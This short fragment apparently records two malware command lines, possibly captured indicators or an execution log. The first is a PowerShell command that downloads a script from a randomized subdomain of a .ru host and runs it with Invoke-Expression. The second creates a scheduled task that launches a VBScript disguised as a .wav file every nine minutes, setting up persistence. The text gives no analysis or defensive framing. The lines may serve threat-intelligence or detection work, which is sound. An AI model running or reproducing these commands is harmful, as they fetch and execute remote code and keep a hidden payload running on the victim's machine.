"powershell.exe" $tmp = $(New-Object net.webclient).DownloadString('http://'+[System.Net.DNS]::GetHostAddresses([string]$(Get-Random)+'.corolain.ru')+'/get.php'); Invoke-Expression $tmp

"schtasks.exe" /CREATE /sc minute /mo 9 /tn "deep-grounded" /tr "wscript.exe 'C:\\Users\\Public\\\\deerfield\\defiance.wav' /b /e:VBScript" /F
